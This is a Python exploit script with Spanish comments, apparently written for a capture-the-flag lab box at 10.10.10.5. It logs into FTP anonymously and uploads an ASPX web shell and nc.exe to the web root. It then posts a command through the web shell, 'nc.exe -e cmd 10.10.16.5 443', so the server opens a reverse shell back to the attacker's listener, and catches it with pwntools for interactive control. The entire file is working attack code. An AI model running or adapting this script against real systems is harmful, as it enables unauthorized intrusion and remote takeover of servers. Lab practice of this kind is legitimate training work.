#!/usr/bin/env python3

from pwn import *
from ftplib import FTP
import requests, re, signal, pdb, sys, time, threading

def def_handler(sig, frame):
  print("\n\n[!] Saliendo ...\n")
  sys.exit(1)

malicious_files = ["console.aspx", "nc.exe"]

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales...
console_url = f"http://10.10.10.5/{malicious_files[0]}"
LPORT=443

def uploadFiles():
  ftp = FTP()
  # ftp.set_debuglevel(2)
  ftp.connect("10.10.10.5", 21)
  ftp.login('anonymous', '')

  for malicious_file in malicious_files:
    ftp.storbinary(f"STOR {malicious_file}", open(malicious_file, "rb"))

def makeRequest():
  s = requests.session()
  r = s.get(console_url)

  post_data = {
    '__VIEWSTATE': re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0],
    '__EVENTVALIDATION': re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0],
    'txtArg': 'c:\\inetpub\\wwwroot\\nc.exe -e cmd 10.10.16.5 443',
    'testing': 'excute'
  }

  # RCE
  r = s.post(console_url, data=post_data)


if __name__ == '__main__':
  uploadFiles()
  try:
    threading.Thread(target=makeRequest, args=()).start()
  except Exception as e:
    log.error(str(e))
  
  shell = listen(LPORT, timeout=20).wait_for_connection()

  shell.interactive()
